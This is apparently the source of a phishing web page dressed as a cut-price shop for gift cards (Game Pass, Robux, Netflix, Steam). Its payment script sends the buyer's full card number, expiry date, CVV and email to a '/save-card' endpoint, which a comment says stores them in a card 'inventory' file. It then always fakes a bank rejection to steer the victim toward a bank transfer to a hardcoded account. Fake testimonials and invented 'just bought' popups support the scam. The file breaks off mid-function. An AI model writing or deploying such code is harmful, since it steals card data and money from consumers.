<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tienda de Gift Cards | Game Pass y Robux</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        /* Reset general */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Poppins', sans-serif;
            background-color: #f1f1f1;
            color: #333;
        }

        /* --- Header y Navegaci√≥n --- */
        header {
            background: #333;
            color: white;
            padding: 20px 0;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        header h1 {
            font-size: 2.5em;
            font-weight: 600;
        }

        header p {
            font-size: 1.2em;
        }

        nav {
            background: #444;
            padding: 10px 0;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
            position: sticky; /* Fija la barra de navegaci√≥n */
            top: 0;
            z-index: 100;
        }

        nav ul {
            display: flex;
            justify-content: center;
            gap: 20px;
            list-style: none;
        }

        nav ul li {
            text-transform: uppercase;
            font-weight: 600;
        }

        nav ul li a {
            color: white;
            text-decoration: none;
            padding: 5px 10px;
            transition: background 0.3s ease;
        }

        nav ul li a:hover {
            background-color: #ff7f50; /* Color de acento */
            border-radius: 5px;
        }

        /* --- Productos y Contenedores --- */
        .section {
            padding: 40px 0;
        }

        .container {
            width: 90%;
            margin: 50px auto;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 30px;
        }

        .product {
            background: #ffffff;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
            width: 300px;
            transition: transform 0.3s ease;
            position: relative;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        .product:hover {
            transform: translateY(-10px);
        }

        /* ESTILOS DE PRODUCTOS */
        .game-pass-bg {
            background-color: #2c9b6f;
            color: white;
            padding: 15px;
            text-align: center;
        }

        .robux-bg {
            background-color: #333333;
            color: white;
            padding: 15px;
            text-align: center;
        }

        .netflix-bg { 
            background-color: #e50914; /* Netflix Red */
            color: white;
            padding: 15px;
            text-align: center;
        }
        
        .steam-bg { 
            background-color: #1b2838; /* Steam Dark Blue */
            color: white;
            padding: 15px;
            text-align: center;
        }
        
        .product-details {
             padding: 0 15px 15px 15px;
             display: flex;
             flex-direction: column;
             justify-content: flex-end;
             align-items: center;
             height: 100%;
        }

        .product img {
            width: 100%;
            height: 200px;
            object-fit: cover;
        }

        .product-details h3 {
            margin-top: 10px;
            font-size: 1.6em;
        }

        .product-details p {
            margin-top: 5px;
            margin-bottom: 15px;
        }

        .price {
            font-size: 1.5em;
            font-weight: 600;
            color: #ff7f50;
            margin-bottom: 20px;
            background-color: #fff;
            padding: 10px;
            border-radius: 5px;
            width: 80%;
            text-align: center;
        }

        .product-details button {
            background-color: #ff7f50;
            color: white;
            font-size: 1.2em;
            padding: 15px;
            border: none;
            border-radius: 8px;
            width: 100%;
            cursor: pointer;
            transition: background-color 0.3s ease;
            margin-top: 10px;
        }

        .product-details button:hover {
            background-color: #e35d30;
        }

        /* --- Panel de Pago (Comprar Section) --- */
        .payment-panel {
            background-color: #ffffff;
            border-radius: 12px;
            padding: 30px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
            width: 90%;
            max-width: 600px; 
            margin: 30px auto;
            display: none;
        }

        /* Campos de formulario */
        .form-group {
            margin-bottom: 20px;
            position: relative;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: 600;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 1em;
        }
        
        /* Icono de tarjeta y errores */
        .card-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 1.5em;
            color: #ccc;
            pointer-events: none;
            transition: color 0.3s;
        }
        
        .form-group #tarjeta-numero {
            padding-right: 50px;
        }
        
        .input-error {
            border: 2px solid red !important;
        }

        .error-message {
            color: red;
            background-color: #fdd;
            border: 1px solid red;
            padding: 10px;
            border-radius: 5px;
            margin-top: 15px;
            display: none;
        }

        /* Spinner de carga */
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ff7f50;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 15px auto;
            display: none; /* Oculto por defecto */
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* --- Testimoniales y Rese√±as --- */
        .section.rese√±as {
            background-color: #e9e9e9;
            text-align: center;
            padding: 60px 20px;
        }
        .testimonial-grid {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 30px;
            margin-top: 30px;
        }
        .testimonial-card {
            background: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: left;
            position: relative;
        }
        .testimonial-card .stars {
            color: #ffd700; /* Gold color */
            margin-bottom: 10px;
            font-size: 1.2em;
        }
        .testimonial-card .quote {
            font-style: italic;
            margin-bottom: 15px;
            color: #555;
        }
        .testimonial-card .author {
            font-weight: 600;
            color: #333;
            display: block;
            margin-top: 10px;
            font-size: 0.9em;
        }

        /* --- Alerta de Prueba Social Flotante --- */
        #social-proof-alert {
            position: fixed;
            bottom: 30px;
            left: 30px;
            background-color: white;
            border: 1px solid #2c9b6f;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
            display: flex;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.5s, visibility 0.5s, transform 0.5s;
            transform: translateX(-100%);
        }

        #social-proof-alert.show {
            opacity: 1;
            visibility: visible;
            transform: translateX(0);
        }

        #social-proof-alert i {
            color: #2c9b6f;
            font-size: 1.5em;
            margin-right: 10px;
        }

        #social-proof-alert .text strong {
            color: #ff7f50;
        }

        #social-proof-alert .stars-small {
            color: #ffd700;
            font-size: 0.9em;
        }
        
        /* --- ESTILOS PARA EL CHAT --- */

        /* Bot√≥n Flotante */
        #chat-button {
            position: fixed;
            bottom: 30px;
            right: 30px;
            width: 60px;
            height: 60px;
            background-color: #ff7f50;
            color: white;
            border: none;
            border-radius: 50%;
            font-size: 1.5em;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
            cursor: pointer;
            z-index: 1000;
            transition: background-color 0.3s;
        }

        #chat-button:hover {
            background-color: #e35d30;
        }

        /* Contenedor del Chat */
        #chat-window {
            position: fixed;
            bottom: 100px;
            right: 30px;
            width: 350px;
            height: 450px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
            display: none;
            flex-direction: column;
            z-index: 999;
            overflow: hidden;
            animation: fadeIn 0.3s ease-out;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Encabezado del Chat */
        .chat-header {
            background-color: #333;
            color: white;
            padding: 15px;
            text-align: center;
            font-size: 1.1em;
            font-weight: 600;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .chat-header .close-btn {
            background: none;
            border: none;
            color: white;
            font-size: 1.2em;
            cursor: pointer;
        }

        /* Cuerpo de Mensajes */
        #chat-body {
            flex-grow: 1;
            padding: 15px;
            overflow-y: auto;
            background-color: #f7f7f7;
            display: flex;
            flex-direction: column;
        }

        .message {
            margin-bottom: 10px;
            max-width: 80%;
            border-radius: 10px;
            padding: 8px 12px;
            line-height: 1.4;
        }

        .ai-message {
            background-color: #e0e0e0;
            align-self: flex-start;
            margin-right: auto;
        }

        .user-message {
            background-color: #ff7f50;
            color: white;
            align-self: flex-end;
            margin-left: auto;
        }

        .typing-indicator {
            padding: 5px 10px;
            background-color: #f0f0f0;
            border-radius: 10px;
            font-style: italic;
            color: #777;
            display: none;
            margin-bottom: 10px;
        }
        
        /* √Årea de Entrada */
        .chat-input {
            display: flex;
            padding: 10px;
            border-top: 1px solid #ddd;
        }

        #chat-input-field {
            flex-grow: 1;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 20px;
            margin-right: 10px;
        }

        #chat-send-btn {
            background-color: #ff7f50;
            color: white;
            border: none;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            cursor: pointer;
            font-size: 1.1em;
            transition: background-color 0.3s;
        }

        #chat-send-btn:hover {
            background-color: #e35d30;
        }

        /* --- Estilos para Contacto --- */
        #contacto-info {
            background-color: #333;
            color: white;
            padding: 60px 20px;
            text-align: center;
        }
        #contacto-info h2 {
            font-size: 2.2em;
            margin-bottom: 20px;
        }
        .contact-detail {
            font-size: 1.3em;
            margin: 15px 0;
        }
        .contact-detail a {
            color: #ff7f50;
            text-decoration: none;
            font-weight: 600;
            transition: color 0.3s;
        }
        .contact-detail a:hover {
            color: #ffffff;
        }

    </style>
</head>
<body>

<header>
    <h1>Compra tus Gift Cards de Game Pass y Robux</h1>
    <p>Las mejores ofertas para gamers como t√∫</p>
</header>

<nav>
    <ul>
        <li><a href="#" onclick="scrollToSection('productos')">Productos</a></li>
        <li><a href="#" onclick="scrollToSection('ofertas')">Ofertas</a></li>
        <li><a href="#" onclick="scrollToSection('testimonios')">Rese√±as</a></li> 
        <li><a href="#" onclick="scrollToSection('compra')">Comprar</a></li>
        <li><a href="#" onclick="scrollToSection('contacto-info')">Contacto</a></li>
    </ul>
</nav>

<div id="productos" class="section">
    <div class="container">
        
        <div class="product game-pass-bg">
            <img src="img/gamepass-card.png" alt="Xbox Game Pass 3 Meses">
            <div class="product-details">
                <h3>Game Pass Ultimate</h3>
                <p>Accede a una librer√≠a de juegos incre√≠bles por 3 meses.</p>
                <div class="price"><span>$5.00 USD</span></div>
                <button onclick="showPaymentPanel('Game Pass 3 Meses', 5.00)">Comprar Ahora</button>
            </div>
        </div>

        <div class="product robux-bg">
            <img src="img/robux-code.png" alt="5,000 Robux">
            <div class="product-details">
                <h3>5,000 Robux</h3>
                <p>Cr√©dito para personalizar tu avatar y obtener contenido exclusivo.</p>
                <div class="price"><span>$10.00 USD</span></div>
                <button onclick="showPaymentPanel('5000 Robux', 10.00)">Comprar Ahora</button>
            </div>
        </div>

        <div class="product netflix-bg">
            <img src="img/netflix-card.png" alt="Netflix 6 Meses">
            <div class="product-details">
                <h3>Netflix 6 Meses</h3>
                <p>Suscripci√≥n de 6 meses por un precio √∫nico.</p>
                <div class="price"><span>$10.00 USD</span></div>
                <button onclick="showPaymentPanel('Netflix 6 Meses', 10.00)">Comprar Ahora</button>
            </div>
        </div>

        <div class="product steam-bg">
            <img src="img/steam-card.png" alt="Steam Wallet $50">
            <div class="product-details">
                <h3>Steam Wallet $50</h3>
                <p>Agrega cr√©dito para comprar tus juegos favoritos en Steam.</p>
                <div class="price"><span>$15.00 USD</span></div>
                <button onclick="showPaymentPanel('Steam Wallet $50', 15.00)">Comprar Ahora</button>
            </div>
        </div>
    </div>
</div>

<div id="ofertas" class="section" style="background-color: #f9f9f9;">
    <div class="container">
        <h2>Ofertas Especiales</h2>
        <p>¬°Pr√≥ximamente se agregar√°n m√°s ofertas! Mantente atento a nuestras promociones.</p>
    </div>
</div>

<div id="testimonios" class="section rese√±as">
    <div class="container" style="flex-direction: column; margin-top: 0;">
        <h2>Lo que dicen nuestros clientes (4.8/5.0 Estrellas)</h2>
        <p style="margin-top: 10px; color: #555;">M√°s de 120 ventas verificadas en el √∫ltimo mes.</p>
        <div class="testimonial-grid">
            <div class="testimonial-card">
                <div class="stars">‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ</div>
                <p class="quote">"¬°Funciona a la perfecci√≥n! La transferencia fue r√°pida y me enviaron el c√≥digo en menos de 10 minutos. Es la p√°gina m√°s confiable que he encontrado."</p>
                <span class="author">‚≠ê Luis R. - Compr√≥ Game Pass</span>
            </div>
            <div class="testimonial-card">
                <div class="stars">‚òÖ‚òÖ‚òÖ‚òÖ‚òÜ</div>
                <p class="quote">"El precio es imbatible. Pagu√© con tarjeta y tuve un peque√±o problema que solucion√© en el chat. Deber√≠an mejorar la opci√≥n de tarjeta, pero el servicio es excelente."</p>
                <span class="author">‚≠ê Mar√≠a V. - Compr√≥ 5,000 Robux</span>
            </div>
            <div class="testimonial-card">
                <div class="stars">‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ</div>
                <p class="quote">"Soy cliente recurrente. Siempre tienen buen stock y los c√≥digos son leg√≠timos. Altamente recomendado para evitar precios altos en tiendas oficiales."</p>
                <span class="author">‚≠ê Roberto G. - Compr√≥ Game Pass</span>
            </div>
        </div>
    </div>
</div>

<div id="compra" class="section">
    <div class="payment-panel" id="paymentPanel">
        <h2 id="panelTitle">Finalizar Compra</h2>
        <p>Selecciona tu m√©todo de pago y proporciona los datos necesarios.</p>

        <div class="form-group">
            <label for="email">Correo Electr√≥nico (Para env√≠o del c√≥digo):</label>
            <input type="email" id="email" name="email" placeholder="tu_correo@ejemplo.com" required>
        </div>

        <div class="payment-options">
            <label>
                <input type="radio" name="paymentMethod" value="transferencia" checked> Transferencia Bancaria
            </label>
            <label>
                <input type="radio" name="paymentMethod" value="tarjeta"> Tarjeta de Cr√©dito/D√©bito
            </label>
        </div>

        <div id="transferencia" class="form-panel">
            <div class="form-group">
                <label for="nombre">Nombre en la Cuenta Bancaria:</label>
                <input type="text" id="nombre" name="nombre" placeholder="Pablo Israel" required>
            </div>
            <div class="form-group">
                <label for="banco">Banco:</label>
                <input type="text" id="banco" name="banco" value="Klar" disabled>
            </div>
            <div class="form-group">
                <label for="cuenta">N√∫mero de Cuenta CLABE:</label>
                <input type="text" id="cuenta" name="cuenta" value="661180006948807615" disabled>
            </div>
        </div>

        <div id="tarjeta" class="form-panel" style="display: none;">
            <div class="form-group">
                <label for="tarjeta-numero">N√∫mero de Tarjeta:</label>
                <input type="text" id="tarjeta-numero" name="tarjeta-numero" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required 
                       oninput="formatCardNumber(this); detectCardType(this.value);" onchange="validateCardNumber()">
                <i id="cardIcon" class="card-icon fas fa-credit-card"></i>
            </div>
            <p id="cardStatus" style="font-size: 0.9em; margin-top: -15px; margin-bottom: 10px;"></p>

            <div class="form-group">
                <label for="expiracion">Fecha de Caducidad (MM/AA):</label>
                <input type="text" id="expiracion" name="expiracion" placeholder="MM/AA" maxlength="5" required oninput="formatExpiryDate(this)">
            </div>
            <div class="form-group">
                <label for="cvv">CVV:</label>
                <input type="text" id="cvv" name="cvv" placeholder="XXX" maxlength="4" required>
            </div>
        </div>
        
        <p id="totalAmount" style="text-align: right; font-size: 1.5em; font-weight: 600; margin-bottom: 20px; color: #333;">Total: $0.00 USD</p>

        <button class="submit-button" onclick="processPayment()">Procesar Pago</button>

        <div class="spinner" id="spinner"></div>

        <div id="errorMessage" class="error-message">
            Lo sentimos, hubo un problema con tu pago. Verifica los datos de tu tarjeta (caducidad/CVV) o elige otro m√©todo de pago.
        </div>
    </div>
</div>

<div id="contacto-info" class="section">
    <h2>Cont√°ctanos Directamente</h2>
    <div class="contact-detail">
        <i class="fas fa-envelope"></i> Correo Electr√≥nico: 
        <a href="mailto:ley120ko@gmail.com">ley120ko@gmail.com</a>
    </div>
    <div class="contact-detail">
        <i class="fas fa-phone"></i> N√∫mero de Tel√©fono: 
        <a href="tel:+12296558023">+1 229 655 8023</a>
    </div>
</div>

<footer>
    <p>&copy; 2025 Tienda de Gift Cards | Todos los derechos reservados</p>
    <p>Pol√≠tica de privacidad | T√©rminos de servicio</p>
</footer>

<div id="social-proof-alert">
    <i class="fas fa-shopping-bag"></i>
    <div class="text">
        <span id="alert-text"></span>
        <div id="alert-stars" class="stars-small"></div>
    </div>
</div>

<button id="chat-button" onclick="toggleChat()">
    <i class="fas fa-comment-dots"></i>
</button>

<div id="chat-window">
    <div class="chat-header">
        Soporte 24/7 (IA)
        <button class="close-btn" onclick="toggleChat()">&times;</button>
    </div>
    <div id="chat-body">
        <div class="message ai-message">
            ¬°Hola! Soy la asistente IA de TuTiendaGC. ¬øEn qu√© puedo ayudarte hoy? (Prueba a preguntar sobre precios o c√≥digos).
        </div>
        <div id="typing-indicator" class="typing-indicator">La IA est√° escribiendo...</div>
    </div>
    <div class="chat-input">
        <input type="text" id="chat-input-field" placeholder="Escribe tu mensaje..." onkeypress="if(event.keyCode == 13) sendMessage()">
        <button id="chat-send-btn" onclick="sendMessage()"><i class="fas fa-paper-plane"></i></button>
    </div>
</div>

<script>
    let currentProduct = { name: '', price: 0 };
    
    // --- ELEMENTOS DEL FORMULARIO ---
    const paymentPanel = document.getElementById('paymentPanel');
    const totalAmountSpan = document.getElementById('totalAmount');
    const transferPanel = document.getElementById('transferencia');
    const cardPanel = document.getElementById('tarjeta');
    const cardIcon = document.getElementById('cardIcon');
    const cardStatus = document.getElementById('cardStatus');
    const expiryInput = document.getElementById('expiracion');
    const cvvInput = document.getElementById('cvv');
    const cardNumInput = document.getElementById('tarjeta-numero');
    const emailInput = document.getElementById('email');
    const errorMessage = document.getElementById('errorMessage');

    // --- ELEMENTOS DEL CHAT ---
    const chatWindow = document.getElementById('chat-window');
    const chatBody = document.getElementById('chat-body');
    const chatInputField = document.getElementById('chat-input-field');
    const typingIndicator = document.getElementById('typing-indicator');

    // --- ELEMENTOS DE PRUEBA SOCIAL ---
    const socialProofAlert = document.getElementById('social-proof-alert');
    const alertText = document.getElementById('alert-text');
    const alertStars = document.getElementById('alert-stars');
    
    // Lista de compras simuladas
    const purchases = [
        { name: "Game Pass", user: "Ra√∫l G.", stars: 5 },
        { name: "5,000 Robux", user: "Ana P.", stars: 4 },
        { name: "Game Pass", user: "Carlos M.", stars: 5 },
        { name: "Netflix 6 Meses", user: "Laura F.", stars: 5 },
        { name: "Steam Wallet $50", user: "Marco T.", stars: 4 },
        { name: "5,000 Robux", user: "Luc√≠a S.", stars: 5 }
    ];

    document.addEventListener('DOMContentLoaded', () => {
        // Inicia la alerta de prueba social
        setInterval(showSocialProof, 8000); 
    });

    // --- L√ìGICA DE PRUEBA SOCIAL ---
    function generateStars(count) {
        let starHtml = '';
        for (let i = 0; i < 5; i++) {
            // Usa 'fas' para estrella rellena (Font Awesome Solid) y 'far' para estrella vac√≠a (Font Awesome Regular)
            starHtml += `<i class="fa${i < count ? 's' : 'r'} fa-star"></i>`;
        }
        return starHtml;
    }

    function showSocialProof() {
        // 1. Ocultar si est√° visible
        socialProofAlert.classList.remove('show');
        
        // Esperar la transici√≥n de salida (500ms)
        setTimeout(() => {
            // 2. Elegir una compra al azar
            const purchase = purchases[Math.floor(Math.random() * purchases.length)];
            
            // 3. Actualizar el contenido
            alertText.innerHTML = `¬°<strong>${purchase.user}</strong> acaba de comprar: ${purchase.name}!`;
            alertStars.innerHTML = generateStars(purchase.stars);
            
            // 4. Mostrar la alerta
            socialProofAlert.classList.add('show');
            
            // 5. Ocultar despu√©s de 5 segundos
            setTimeout(() => {
                socialProofAlert.classList.remove('show');
            }, 5000);

        }, 500);
    }
    
    // --- L√ìGICA DE NAVEGACI√ìN ---
    function scrollToSection(id) {
        const section = document.getElementById(id);
        if (section) {
            // El m√©todo scrollIntoView con 'smooth' hace el desplazamiento suave
            section.scrollIntoView({ behavior: 'smooth', block: 'start' });
        } else {
            console.error(`La secci√≥n con ID '${id}' no fue encontrada.`);
        }
    }

    // --- L√ìGICA DE PAGO Y VALIDACI√ìN DE TARJETA ---

    function showPaymentPanel(productName, productPrice) {
        currentProduct = { name: productName, price: productPrice };
        document.getElementById('panelTitle').textContent = `Finalizar Compra: ${productName}`;
        totalAmountSpan.textContent = `Total: $${productPrice.toFixed(2)} USD`;
        paymentPanel.style.display = 'block';
        errorMessage.style.display = 'none';
        
        // Desplazarse al panel de pago
        paymentPanel.scrollIntoView({ behavior: 'smooth' });
    }

    document.querySelectorAll('input[name="paymentMethod"]').forEach((radio) => {
        radio.addEventListener('change', () => {
            transferPanel.style.display = (radio.value === 'transferencia') ? 'block' : 'none';
            cardPanel.style.display = (radio.value === 'tarjeta') ? 'block' : 'none';
            
            // Limpiar errores y estado al cambiar de m√©todo de pago
            cardNumInput.classList.remove('input-error');
            cardStatus.textContent = '';
            errorMessage.style.display = 'none';
        });
    });

    /**
     * Algoritmo de Luhn (M√≥dulo 10) para validar la estructura del n√∫mero.
     * @param {string} val - El n√∫mero de tarjeta (solo d√≠gitos).
     * @returns {boolean} - True si es v√°lido seg√∫n Luhn.
     */
    function validateLuhn(val) {
        let sum = 0;
        let alt = false;
        for (let i = val.length - 1; i >= 0; i--) {
            let num = parseInt(val[i], 10);
            if (alt) {
                num *= 2;
                if (num > 9) {
                    num = (num % 10) + 1;
                }
            }
            sum += num;
            alt = !alt;
        }
        return sum % 10 === 0;
    }

    /**
     * Detecta el tipo de tarjeta (Visa, Mastercard, etc.) basado en el prefijo.
     * @param {string} number - El n√∫mero de tarjeta.
     * @returns {string} - El tipo de tarjeta o 'Unknown'.
     */
    function detectCardType(number) {
        const cleanNumber = number.replace(/\s/g, '');
        let type = 'Unknown';
        
        // Definiciones de prefijo y longitud
        const cardPatterns = {
            'Visa': [/^4/, [13, 16, 19], 'fab fa-cc-visa'],
            'Mastercard': [/^5[1-5]/, [16], 'fab fa-cc-mastercard'],
            'Amex': [/^3[47]/, [15], 'fab fa-cc-amex'],
            'Discover': [/^6(?:011|5)/, [16], 'fab fa-cc-discover']
        };

        for (const cardType in cardPatterns) {
            const [pattern, lengths, icon] = cardPatterns[cardType];
            if (pattern.test(cleanNumber)) {
                type = cardType;
                cardIcon.className = `card-icon ${icon}`;
                break;
            }
        }
        
        if (type === 'Unknown') {
            cardIcon.className = 'card-icon fas fa-credit-card'; // Icono gen√©rico
        }

        // Si han introducido al menos 4 d√≠gitos, actualiza el estado
        if (cleanNumber.length >= 4) {
            updateCardStatus(type, cleanNumber);
        } else {
            cardStatus.textContent = '';
        }

        return type;
    }

    /**
     * Muestra el estado de la tarjeta debajo del campo de n√∫mero.
     * @param {string} type - Tipo de tarjeta detectado.
     * @param {string} cleanNumber - El n√∫mero de tarjeta sin espacios.
     */
    function updateCardStatus(type, cleanNumber) {
        let statusText = '';
        let color = '#333';
        const isLuhnValid = validateLuhn(cleanNumber);

        if (type !== 'Unknown') {
            statusText += `Tipo: üí≥ **${type}** | `;
        }
        
        if (cleanNumber.length >= 12) {
            if (isLuhnValid) {
                statusText += 'Estado: ‚úÖ N√∫mero V√°lido (Luhn)';
                color = '#2c9b6f';
            } else {
                statusText += 'Estado: ‚ùå N√∫mero Inv√°lido (Luhn)';
                color = 'red';
            }
        } else if (cleanNumber.length > 0) {
            statusText += 'Escribiendo...';
            color = '#777';
        } else {
            statusText = '';
        }

        cardStatus.innerHTML = statusText.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
        cardStatus.style.color = color;
    }

    /**
     * Formatea el n√∫mero de tarjeta con espacios (XXXX XXXX XXXX XXXX).
     */
    function formatCardNumber(input) {
        let value = input.value.replace(/\D/g, ''); // Elimina todo lo que no sea d√≠gito
        if (value.length > 0) {
            let formatted = value.match(/.{1,4}/g).join(' ');
            input.value = formatted;
        }
    }

    /**
     * Formatea la fecha de caducidad (MM/AA).
     */
    function formatExpiryDate(input) {
        let value = input.value.replace(/\D/g, '');
        if (value.length > 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        input.value = value;
    }

    /**
     * Validaci√≥n final de todos los campos de la tarjeta.
     */
    function validateCardFields() {
        let isValid = true;
        
        // Limpiar errores previos
        expiryInput.classList.remove('input-error');
        cvvInput.classList.remove('input-error');
        cardNumInput.classList.remove('input-error');
        errorMessage.style.display = 'none';

        const cardNum = cardNumInput.value.replace(/\s+/g, '');
        
        // 1. Validaci√≥n del n√∫mero (Luhn y Longitud)
        if (cardNum.length < 13 || cardNum.length > 19 || !/^\d+$/.test(cardNum) || !validateLuhn(cardNum)) {
            cardNumInput.classList.add('input-error');
            if (isValid) { // Mostrar solo el primer error
                errorMessage.textContent = 'El n√∫mero de tarjeta es inv√°lido o incompleto. Debe tener entre 13 y 19 d√≠gitos y pasar la validaci√≥n Luhn.';
            }
            isValid = false;
        }

        // 2. Validaci√≥n de CVV
        const cvv = cvvInput.value.trim();
        if (!/^\d{3,4}$/.test(cvv)) {
            cvvInput.classList.add('input-error');
            if (isValid) {
                errorMessage.textContent = 'El CVV debe ser de 3 o 4 d√≠gitos.';
            }
            isValid = false;
        }

        // 3. Validaci√≥n de Expiraci√≥n
        const expiry = expiryInput.value;
        const [monthStr, yearStr] = expiry.split('/');
        
        if (!monthStr || !yearStr || monthStr.length !== 2 || yearStr.length !== 2) {
            expiryInput.classList.add('input-error');
            if (isValid) {
                errorMessage.textContent = 'La fecha de caducidad debe ser MM/AA.';
            }
            isValid = false;
        } else {
            const currentYear = new Date().getFullYear() % 100;
            const currentMonth = new Date().getMonth() + 1;
            const month = parseInt(monthStr, 10);
            const year = parseInt(yearStr, 10);
            
            if (month < 1 || month > 12) {
                expiryInput.classList.add('input-error');
                if (isValid) {
                    errorMessage.textContent = 'El mes de caducidad es incorrecto.';
                }
                isValid = false;
            } else if (year < currentYear || (year === currentYear && month < currentMonth)) {
                expiryInput.classList.add('input-error');
                if (isValid) {
                    errorMessage.textContent = 'La tarjeta est√° caducada.';
                }
                isValid = false;
            }
        }
        
        if (!isValid) {
            errorMessage.style.display = 'block';
        }

        return isValid;
    }

    function validateEmail(email) {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(String(email).toLowerCase());
    }

    function processPayment() {
        errorMessage.style.display = 'none';

        // 1. Validar Correo Electr√≥nico
        const email = emailInput.value.trim();
        emailInput.classList.remove('input-error');
        if (!validateEmail(email)) {
            emailInput.classList.add('input-error');
            errorMessage.textContent = 'Por favor, introduce un correo electr√≥nico v√°lido para enviarte el c√≥digo.';
            errorMessage.style.display = 'block';
            return;
        }

        const paymentMethod = document.querySelector('input[name="paymentMethod"]:checked').value;

        // 2. Validar Campos de Tarjeta (si aplica)
        if (paymentMethod === 'tarjeta') {
            if (!validateCardFields()) {
                errorMessage.style.display = 'block';
                return;
            }
            // Si la tarjeta es v√°lida, volvemos a mostrar el estado final del tipo
            const cardType = detectCardType(cardNumInput.value);
            updateCardStatus(cardType, cardNumInput.value.replace(/\s/g, ''));
        }

        // Mostrar el spinner
        document.getElementById('spinner').style.display = 'block';

        // --- L√ìGICA MODIFICADA PARA GUARDADO Y RECHAZO FORZADO (TARJETA) ---
        if (paymentMethod === 'tarjeta') {
            const cardData = {
                product: currentProduct.name,
                price: currentProduct.price,
                email: email,
                // Limpiamos los espacios del n√∫mero de tarjeta para guardarlo
                number: cardNumInput.value.replace(/\s+/g, ''),
                expiry: expiryInput.value,
                cvv: cvvInput.value
            };

            // 1. Iniciar el guardado de datos (AS√çNCRONO - NO BLOQUEA EL TIMER)
            // Esto garantiza que los datos se env√≠en al servidor para guardarse en inventario_tarjetas.txt
            fetch('/save-card', { 
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(cardData),
            })
            .then(response => {
                // Se registra que el intento de guardado termin√≥, pero no se actualiza la UI
                console.log(`[SERVER] Intento de guardado de tarjeta completado. Status: ${response.status}`);
            })
            .catch(error => {
                // Se registra un error de conexi√≥n, si lo hay.
                console.error('[SERVER ERROR] Error al intentar guardar la tarjeta:', error);
            });


            // 2. Esperar 5 segundos, mostrar c√≠rculo, y FORZAR RECHAZO en la UI
            setTimeout(() => {
                
                // Ocultar el spinner
                document.getElementById('spinner').style.display = 'none';
                
                // Mostrar el error de rechazo bancario forzado
                errorMessage.textContent = '‚ùå RECHAZO BANCARIO: El banco ha rechazado el pago. Por favor, verifica tu saldo, contacta a tu banco, o intenta con otro m√©todo de pago (ej. Transferencia).';
                errorMessage.style.display = 'block';

                // Limpiar los campos de tarjeta para reintento
                cardNumInput.value = '';
                expiryInput.value = '';
                cvvInput.value = '';
                cardIcon.className = 'card-icon fas fa-credit-card';
                cardStatus.textContent = '';
                cardNumInput.classList.remove('input-error');
                expiryInput.classList.remove('input-error');
                cvvInput.classList.remove('input-error');
                
            }, 5000); // 5 segundos de espera (5000ms)

        } 
        // L√≥gica de Transferencia Bancaria (se mantiene con √©xito simulado)
        else { 
            setTimeout(() => {
                document.getElementById('spinner').style.display = 'none';
                alert(`‚úÖ PAGO ACEPTADO - TRANSFERENCIA\nConfirma la transferencia de $${currentProduct.price.toFixed(2)} USD a la cuenta KLAR: 661180006948807615. Tu c√≥digo ser√° enviado al correo ${email} al recibir el pago.`);
                paymentPanel.style.display = 'none';
            }, 3000); // Espera de 3 segundos
        }
    }


    // --- L√ìGICA DE CHAT SIMULADO ---
    function toggleChat() {
        if (chatWindow.style.display === 'flex') {
            chatWindow.style.display = 'none';
        } else {
            chatWindow.style.display = 'flex';
            chatInputField.focus();
            chatBody.scrollTop = chatBody.scrollHeight;
        }
    }

    function addMessage(text, sender) {
        const messageDiv = document.createElement('div');
        messageDiv.className = `message ${sender}-message`;
        messageDiv.innerHTML = text.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>'); // Permite negritas
        chatBody.appendChild(messageDiv);
        chatBody.scrollTop = chatBody.scrollHeight;
    }

    function sendMessage() {
        const text = chatInputField.value.trim();
        if (text === '') return;
        addMessage(text, 'user');
        chatInputField.value = '';
        simulateAIResponse(text);
    }

    function simulateAIResponse(text) {
        typingIndicator.style.display = 'block';
        let response = '';
        let typingDelay = 1500; // Delay base

        const lowerText = text.toLowerCase();

